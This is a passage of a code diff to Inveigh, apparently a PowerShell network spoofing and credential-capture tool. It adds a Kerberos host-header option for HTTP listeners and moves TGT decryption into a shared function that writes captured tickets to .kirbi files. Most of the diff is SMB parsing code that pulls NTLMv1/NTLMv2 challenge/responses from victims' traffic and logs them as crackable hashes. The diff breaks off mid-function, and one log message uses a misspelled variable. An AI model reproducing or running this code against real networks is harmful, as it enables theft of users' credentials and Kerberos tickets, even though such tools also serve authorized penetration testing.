@@ -161,6 +161,10 @@ realm (e.g., TEST.LOCALhostwks1.test.local)
 .PARAMETER KerberosHash
 AES256 password hash that will be used to decrypt Kerberos TGT captures. This is not required if using KerberosCredential.
 
+.PARAMETER KerberosHostHeader
+Comma seperated list of hosts that the HTTP/HTTPS/Proxy listener will compare to host headers. If a match is found, the
+listener will attempt to negotiate to Kerberos.
+
 .PARAMETER LogOutput
 Default = Enabled: (Y/N) Enable/Disable storing log messages in memory.
 
@@ -383,6 +387,7 @@ https://github.com/Kevin-Robertson/Inveigh
 param
 ( 
     [parameter(Mandatory=$false)][Array]$ADIDNSHostsIgnore = ("isatap","wpad"),
+    [parameter(Mandatory=$false)][Array]$KerberosHostHeader = "",
     [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$PcapPortTCP = ("139","445"),
     [parameter(Mandatory=$false)][Array]$PcapPortUDP = "",
@@ -435,7 +440,7 @@ param
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Kerberos = "Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Kerberos = "N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
@@ -557,7 +562,7 @@ if($HTTPDefaultFile -or $HTTPDefaultEXE)
 
 }
 
-if($Kerberos -and !$KerberosCredential -and !$KerberosHash)
+if($Kerberos -eq 'Y' -and !$KerberosCredential -and !$KerberosHash)
 {
     Write-Output "[-] You must specify a -KerberosCredential or -KerberosHash when enabling Kerberos capture"
     throw
@@ -602,7 +607,6 @@ if(!$inveigh)
     $inveigh.enumerate = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
     $inveigh.log = New-Object System.Collections.ArrayList
-    $inveigh.kerberos_packet_list = New-Object System.Collections.ArrayList
     $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
     $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
@@ -625,7 +629,6 @@ if(!$inveigh)
     $inveigh.group_table = [HashTable]::Synchronized(@{})
     $inveigh.session_count = 0
     $inveigh.session = @()
-    $inveigh.kerberos_index = 0
 }
 
 if($inveigh.running)
@@ -729,12 +732,6 @@ if(!$elevated_privilege)
     if($PcapOutput -eq 'File')
     {
         Write-Output "[-] Pcap file output requires elevated privileges"
-        throw
-    }
-
-    if($Kerberos -eq 'Y')
-    {
-        Write-Output "[-] Kerberos TGT capture requires elevated privileges"
         throw
     }
 
@@ -1093,17 +1090,10 @@ else
 if($SMB -eq 'Y' -and $elevated_privilege)
 {
     $inveigh.output_queue.Add("[+] SMB Capture = Enabled")  > $null
-
-    if($Kerberos -eq 'Y')
-    {
-        $inveigh.output_queue.Add("[+] SMB Kerberos TGT Capture = Enabled")  > $null
-    }
-
 }
 else
 {
     $inveigh.output_queue.Add("[+] SMB Capture = Disabled")  > $null
-    $inveigh.output_queue.Add("[+] SMB Kerberos TGT Capture = Disabled")  > $null
 }
 
 if($HTTP -eq 'Y')
@@ -1385,6 +1375,22 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
         $inveigh.output_queue.Add("[+] NTLM Challenge = $Challenge")  > $null
     }
 
+}
+
+if($Kerberos -eq 'Y')
+{
+    $inveigh.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
+    $inveigh.output_queue.Add("[+] Kerberos TGT File Output Count = $KerberosCount")  > $null
+    
+    if($KerberosHostHeader.Count -gt 0)
+    {
+        $inveigh.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($KerberosHostHeader -join ","))  > $null
+    }
+
+}
+else
+{
+    $inveigh.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
 }
 
 if($MachineAccounts -eq 'N')
@@ -2594,252 +2600,9 @@ $ADIDNS_functions_scriptblock =
 
 }
 
-# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
-$SMB_NTLM_functions_scriptblock =
+# Kerberos Functions ScriptBlock
+$kerberos_functions_scriptblock = 
 {
-    
-    function Get-SMBConnection
-    {
-        param ([Byte[]]$Payload,[String]$SourceIP,[String]$SourcePort,[String]$Port)
-
-        $payload_converted = [System.BitConverter]::ToString($Payload)
-        $payload_converted = $payload_converted -replace "-",""
-        $session = "$SourceIP`:$SourcePort"
-        $SMB_index = $payload_converted.IndexOf("FF534D42")
-
-        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72")
-        {
-            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) negotiation request detected from $Session") > $null
-        }
-
-        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
-        {
-            $inveigh.SMB_session_table.Add($Session,"")
-        }
-
-        $SMB_index = $payload_converted.IndexOf("FE534D42")
-
-        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000")
-        {
-            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) negotiation request detected from $Session") > $null
-        }
-
-        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
-        {
-            $inveigh.SMB_session_table.Add($Session,"")
-        }
-
-        $SMB_index = $payload_converted.IndexOf("2A864886F7120102020100")
-
-        if($SMB_index -gt 0)
-        {
-            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) authentication method is Kerberos for $Session") > $null
-
-            if($Kerberos -eq 'Y')
-            {
-                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]
-                $kerberos_length -= $SMB_index / 2
-                $inveigh.kerberos_packet_list.Add($Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]) > $null
-            }
-
-        }
-
-        return $kerberos_length
-    }
-
-    function Get-SMBNTLMChallenge
-    {
-        param ([Byte[]]$Payload)
-
-        $payload_converted = [System.BitConverter]::ToString($Payload)
-        $payload_converted = $payload_converted -replace "-",""
-        $NTLM_index = $payload_converted.IndexOf("4E544C4D53535000")
-
-        if($NTLM_index -gt 0)
-        {
-
-            if($payload_converted.SubString(($NTLM_index + 16),8) -eq "02000000")
-            {
-                $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)
-            }
-
-            $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload
-            $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)
-            $negotiate_flags = [Convert]::ToString($negotiate_flags,2)
-            $target_info_flag = $negotiate_flags.SubString(0,1)
-
-            if($target_info_flag -eq 1)
-            {
-                $target_info_index = ($NTLM_index + 80) / 2
-                $target_info_index = $target_info_index + $target_name_length + 16
-                $target_info_item_type = $Payload[$target_info_index]
-                $i = 0
-
-                while($target_info_item_type -ne 0 -and $i -lt 10)
-                {
-                    $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload
-
-                    switch($target_info_item_type) 
-                    {
-
-                        2
-                        {
-                            $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
-                        }
-
-                        3
-                        {
-                            $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
-                        }
-
-                        4
-                        {
-                            $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
-                        }
-
-                    }
-
-                    $target_info_index = $target_info_index + $target_info_item_length + 4
-                    $target_info_item_type = $Payload[$target_info_index]
-                    $i++
-                }
-
-                if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
-                {
-                    $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
-                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
-                }
-
-                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
-                {
-
-                    if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)
-                    {
-                        $inveigh.enumerate[$i].Hostname = $DNS_computer_name
-                        $inveigh.enumerate[$i]."DNS Domain" = $DNS_domain_name
-                        $inveigh.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
-                        break
-                    }
-
-                }
-
-            }
-
-        }
-
-        return $NTLM_challenge
-    }
-
-    function Get-SMBNTLMResponse
-    {
-        param ([Byte[]]$Payload,[String]$Session,[String]$Port)
-
-        $payload_converted = [System.BitConverter]::ToString($Payload)
-        $payload_converted = $payload_converted -replace "-",""
-        $NTLMSSP_hex_offset = $payload_converted.IndexOf("4E544C4D53535000")
-
-        if($NTLMSSP_hex_offset -gt 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
-        {
-            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
-            $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload
-            $LM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 16) $Payload
-            $LM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""
-            $NTLM_length = Get-UInt16DataLength ($NTLMSSP_offset + 20) $Payload
-            $NTLM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 24) $Payload
-            $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
-            $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload
-            $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload
-            $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
-            $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload
-            $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload
-            $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload
-            $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload
-            $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload
-            $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload
-            $NTLM_challenge = $inveigh.SMB_session_table.$Session
-
-            if($NTLM_length -gt 24)
-            {
-                $NTLMv2_response = $NTLM_response.Insert(32,':')
-                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
-
-                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
-                {
-                    $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
-
-                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
-                    {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLMv2_hash") > $null
-                    }
-                    else
-                    {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
-                    }
-
-                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
-                    {
-                        $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
-                    }
-
-                    if($inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
-                    {
-                        $inveigh.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string") > $null
-                    }
-
-                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
-                    {
-                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString) > $null
-                    }
-
-                }
-
-            }
-            elseif($NTLM_length -eq 24)
-            {
-                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
-
-                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
-                {
-                    $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
-
-                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
-                    {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLMv1_hash") > $null
-                    }
-                    else
-                    {
-                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP($NTLM_host_string)`:$source_port`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
-                    }
-
-                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
-                    {
-                        $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
-                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
-                    }
-
-                    if($inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
-                    {
-                        $inveigh.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string") > $null
-                    }
-
-                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
-                    {
-                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString) > $null
-                    }
-
-                }
-
-            }
-            elseif($NTLM_length -eq 0)
-            {
-                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLM null response from $source_IP($NTLM_host_string)`:$source_port") > $null
-            }
-
-            Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP
-        }
-
-    }
 
     function Get-KerberosAES256BaseKey
     {
@@ -3149,20 +2912,20 @@ $SMB_NTLM_functions_scriptblock =
 
     function New-KerberosKirbi
     {
-        param([Byte[]]$base_key,[String]$port)
+        param([Byte[]]$data,[Byte[]]$base_key,[String]$service,[String]$service_port,[String]$session)
 
-        $apreq_converted = [System.BitConverter]::ToString($inveigh.kerberos_packet_list[$inveigh.kerberos_index])
+        $apreq_converted = [System.BitConverter]::ToString($data)
         $apreq_converted = $apreq_converted -replace "-",""
         $ASN1_index = $apreq_converted.IndexOf("A003020112A1030201")
 
         if($ASN1_index -ge 0)
         {
-            $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + 10)..($ASN1_index / 2 + 15)]
+            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 10)..($ASN1_index / 2 + 15)]
             $ASN1_length = $ASN1[0]
-            $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + 15)]
+            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + 15)]
             $ASN1_length += $ASN1[0]
             $cipher_length = $ASN1[1]
-            [Byte[]]$cipher = $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 9)]
+            [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 9)]
             [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 2 $base_key
             [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
             $cleartext = $cleartext[16..$cleartext.Count]
@@ -3178,12 +2941,12 @@ $SMB_NTLM_functions_scriptblock =
 
                 if($ASN1_index -ge 0)
                 {
-                    $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
+                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
                     $ASN1_length = $ASN1[0]
-                    $ASN1 = Get-ASN1Length $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
+                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
                     $ASN1_length += $ASN1[0]
                     $cipher_length = $ASN1[1]
-                    [Byte[]]$cipher = $inveigh.kerberos_packet_list[$inveigh.kerberos_index][($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
+                    [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
                     [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
                     [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 14 $session_key
                     $cleartext = $cleartext[16..$cleartext.Count]
@@ -3215,7 +2978,7 @@ $SMB_NTLM_functions_scriptblock =
 
                         if($username -notmatch '[^\x00-\x7F]+' -and $realm -notmatch '[^\x00-\x7F]+')
                         {
-                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($port) Kerberos TGT captured for $username@$realm from $source_IP`:$source_port") > $null   
+                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $service($service_port) Kerberos TGT captured for $username@$realm from $session") > $null   
                             $inveigh.kerberos_TGT_list.Add($kirbi) > $null
                             $inveigh.kerberos_TGT_username_list.Add("$source_IP $username $realm $($inveigh.kerberos_TGT_list.Count - 1)") > $null
                             $kirbi_count = ($inveigh.kerberos_TGT_username_list -like "* $username $realm *").Count
@@ -3230,7 +2993,7 @@ $SMB_NTLM_functions_scriptblock =
                                 $krb_file = New-Object System.IO.FileStream $krb_path,'Append','Write','Read'
                                 $krb_file.Write($kirbi,0,$kirbi.Count)
                                 $krb_file.close()
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($port) Kerberos TGT for $username@$realm written to $krb_path") > $null
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $service($service_port) Kerberos TGT for $username@$realm written to $krb_path") > $null
                             }
                             catch
                             {
@@ -3244,19 +3007,19 @@ $SMB_NTLM_functions_scriptblock =
                     }
                     else
                     {
-                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos TGT not found from $source_IP`:$source_port") > $null    
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos TGT not found from $session") > $null    
                     }
 
                 }
                 else
                 {
-                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos autenticator not found from $source_IP`:$source_port") > $null    
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos autenticator not found from $sessiont") > $null    
                 }
 
             }
             else
             {
-                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos failed to decrypt capture from $source_IP`:$source_port") > $null    
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to decrypt capture from $session") > $null    
             }
 
         }
@@ -3287,13 +3050,262 @@ $SMB_NTLM_functions_scriptblock =
                     $encryption_type = "DES-CBC-CRC"
                 }
 
-                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos unsupported encryption type $encryption_type from $source_IP`:$source_port") > $null
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos unsupported encryption type $encryption_type from $session") > $null
             }
             else
             {
-                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($port) Kerberos failed to extract AS-REQ from $source_IP`:$source_port") > $null 
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $service($service_port) Kerberos failed to extract AS-REQ from $session") > $null 
             }
                
+        }
+
+    }
+
+}
+
+# SMB NTLM Functions ScriptBlock - function for parsing NTLM challenge/response
+$SMB_NTLM_functions_scriptblock =
+{
+    
+    function Get-SMBConnection
+    {
+        param ([Byte[]]$Payload,[String]$SourceIP,[String]$SourcePort,[String]$Port)
+
+        $payload_converted = [System.BitConverter]::ToString($Payload)
+        $payload_converted = $payload_converted -replace "-",""
+        $session = "$SourceIP`:$SourcePort"
+        $SMB_index = $payload_converted.IndexOf("FF534D42")
+
+        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq "72")
+        {
+            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) negotiation request detected from $Session") > $null
+        }
+
+        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
+        {
+            $inveigh.SMB_session_table.Add($Session,"")
+        }
+
+        $SMB_index = $payload_converted.IndexOf("FE534D42")
+
+        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq "0000")
+        {
+            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) negotiation request detected from $Session") > $null
+        }
+
+        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)
+        {
+            $inveigh.SMB_session_table.Add($Session,"")
+        }
+
+        $SMB_index = $payload_converted.IndexOf("2A864886F7120102020100")
+
+        if($SMB_index -gt 0)
+        {
+            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) authentication method is Kerberos for $Session") > $null
+
+            if($Kerberos -eq 'Y')
+            {
+                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]
+                $kerberos_length -= $SMB_index / 2
+                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]
+            }
+
+        }
+
+        return $kerberos_length,$kerberos_data
+    }
+
+    function Get-SMBNTLMChallenge
+    {
+        param ([Byte[]]$Payload)
+
+        $payload_converted = [System.BitConverter]::ToString($Payload)
+        $payload_converted = $payload_converted -replace "-",""
+        $NTLM_index = $payload_converted.IndexOf("4E544C4D53535000")
+
+        if($NTLM_index -gt 0)
+        {
+
+            if($payload_converted.SubString(($NTLM_index + 16),8) -eq "02000000")
+            {
+                $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)
+            }
+
+            $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload
+            $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)
+            $negotiate_flags = [Convert]::ToString($negotiate_flags,2)
+            $target_info_flag = $negotiate_flags.SubString(0,1)
+
+            if($target_info_flag -eq 1)
+            {
+                $target_info_index = ($NTLM_index + 80) / 2
+                $target_info_index = $target_info_index + $target_name_length + 16
+                $target_info_item_type = $Payload[$target_info_index]
+                $i = 0
+
+                while($target_info_item_type -ne 0 -and $i -lt 10)
+                {
+                    $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload
+
+                    switch($target_info_item_type) 
+                    {
+
+                        2
+                        {
+                            $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
+                        }
+
+                        3
+                        {
+                            $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
+                        }
+
+                        4
+                        {
+                            $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
+                        }
+
+                    }
+
+                    $target_info_index = $target_info_index + $target_info_item_length + 4
+                    $target_info_item_type = $Payload[$target_info_index]
+                    $i++
+                }
+
+                if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
+                {
+                    $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
+                }
+
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)
+                    {
+                        $inveigh.enumerate[$i].Hostname = $DNS_computer_name
+                        $inveigh.enumerate[$i]."DNS Domain" = $DNS_domain_name
+                        $inveigh.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
+                        break
+                    }
+
+                }
+
+            }
+
+        }
+
+        return $NTLM_challenge
+    }
+
+    function Get-SMBNTLMResponse
+    {
+        param ([Byte[]]$Payload,[String]$Session,[String]$Port)
+
+        $payload_converted = [System.BitConverter]::ToString($Payload)
+        $payload_converted = $payload_converted -replace "-",""
+        $NTLMSSP_hex_offset = $payload_converted.IndexOf("4E544C4D53535000")
+
+        if($NTLMSSP_hex_offset -gt 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
+        {
+            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
+            $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload
+            $LM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 16) $Payload
+            $LM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""
+            $NTLM_length = Get-UInt16DataLength ($NTLMSSP_offset + 20) $Payload
+            $NTLM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 24) $Payload
+            $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
+            $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload
+            $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload
+            $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
+            $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload
+            $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload
+            $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload
+            $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload
+            $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload
+            $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload
+            $NTLM_challenge = $inveigh.SMB_session_table.$Session
+
+            if($NTLM_length -gt 24)
+            {
+                $NTLMv2_response = $NTLM_response.Insert(32,':')
+                $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response
+
+                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                {
+                    $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null
+
+                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
+                    {
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP`:$source_port($NTLM_host_string)`:`n$NTLMv2_hash") > $null
+                    }
+                    else
+                    {
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response captured from $source_IP`:$source_port($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
+                    }
+
+                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
+                    {
+                        $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv2 challenge/response written to " + $inveigh.NTLMv2_out_file) > $null
+                    }
+
+                    if($inveigh.NTLMv2_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    {
+                        $inveigh.NTLMv2_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string") > $null
+                    }
+
